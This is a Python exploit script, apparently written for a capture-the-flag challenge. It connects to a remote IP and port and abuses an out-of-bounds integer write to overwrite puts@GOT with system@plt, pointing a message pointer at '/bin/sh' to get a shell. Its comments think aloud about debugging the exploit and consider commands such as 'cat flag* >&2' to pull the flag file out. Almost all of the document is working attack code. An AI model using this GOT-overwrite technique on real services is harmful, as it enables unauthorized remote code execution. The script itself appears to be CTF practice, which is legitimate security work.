#!/usr/bin/env python3
"""
Simplest approach: Just overwrite msg to point to a useful string
Then when program does puts(msg), it will print that string
But we need RCE...

Wait - the real issue might be that system() needs proper environment.
Let me try a different target: __free_hook or similar.

Actually, let's debug: maybe the program DOES spawn shell but we can't interact with it
because stdin/stdout aren't connected properly through the timeout wrapper.

Let me try: make the shell write output to a file we can read
"""
import socket
import time
import struct

values_base = 0x6010c0
puts_got = 0x601020
system_plt = 0x4006c0
msg_addr = 0x601068

offset_puts = (puts_got - values_base) // 4
offset_msg = (msg_addr - values_base) // 4

binsh1 = struct.unpack('<I', b'/bin')[0]
binsh2 = struct.unpack('<I', b'/sh\x00')[0]

# Try a different command that outputs to stderr or similar
# Or use a command that creates observable side effect

# Let's try writing flag to a web-accessible location
# Or better: use 'cat flag* >&2' to output to stderr

print("[*] Attempting shell with stderr redirect...")

s = socket.socket()
s.settimeout(10)
s.connect(('34.84.25.24', 58554))

def sp(i,v):
    s.recv(1024); s.sendall(f"{i}\n".encode()); time.sleep(0.05)
    s.recv(1024); s.sendall(f"{v}\n".encode()); time.sleep(0.05)

# Exploit
sp(0, binsh1); sp(1, binsh2)
sp(offset_msg, values_base); sp(offset_msg+1, 0)
sp(offset_puts, system_plt); sp(offset_puts+1, 0)

# Exit
s.recv(1024); s.sendall(b"-1\n"); time.sleep(0.5)

# The issue might be that system("/bin/sh") starts interactive shell
# but the connection closes immediately. Let's try non-interactive command:
# We need to modify what system() receives...

# Actually wait - let me check if we can write a different command string

print("[*] Reading any output...")
s.settimeout(2)
out = b''
try:
    for _ in range(5):
        out += s.recv(8192)
except:
    pass

print(out.decode(errors='ignore'))
print(f"\n[*] Got {len(out)} bytes")

# The real problem: system("/bin/sh") expects interactive terminal
# But we're going through 'timeout' wrapper which might not pass through properly

# Solution: We need to write a COMMAND not just "/bin/sh"
# Like "cat /home/user/flag* >&0" or similar

s.close()

print("\n[!] The issue is likely that /bin/sh starts but has no proper stdio")
print("[!] We need to write a complete command like 'cat flag*' not just '/bin/sh'")
print("[!] But that's longer than 8 bytes...")
print("\n[*] Alternative: Use environment variable or command substitution")
print("[*] Or: Chain multiple writes to create longer command string")
